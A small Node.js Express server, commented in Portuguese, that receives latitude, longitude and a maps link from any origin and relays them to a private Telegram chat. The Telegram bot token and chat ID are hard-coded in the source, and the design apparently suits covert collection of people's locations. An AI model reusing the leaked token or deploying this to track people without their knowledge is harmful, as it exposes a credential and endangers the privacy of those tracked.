const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const app = express();

// Configuração CORS manual + middleware
app.use(cors({
  origin: "*", // ou especifique sua origem, ex: "https://seusite.vercel.app"
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type"]
}));

app.use(bodyParser.json());

// Requisições OPTIONS (preflight)
app.options("/send-location", (req, res) => {
  res.sendStatus(200);
});

const TELEGRAM_BOT_TOKEN = "7741903708:AAGZQpnoLQIC-9WowgtBJUpqTTP8BAsaLO8";
const TELEGRAM_CHAT_ID = "-4728722007";

app.post("/send-location", async (req, res) => {
  const { latitude, longitude, maps } = req.body;

  const message = `📍 Localização recebida:\n\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Erro ao enviar para o Telegram:", error);
    res.status(500).json({ success: false, message: "Erro ao enviar localização." });
  }
});

app.listen(8088, () => {
  console.log("Servidor rodando na porta 8088");
});
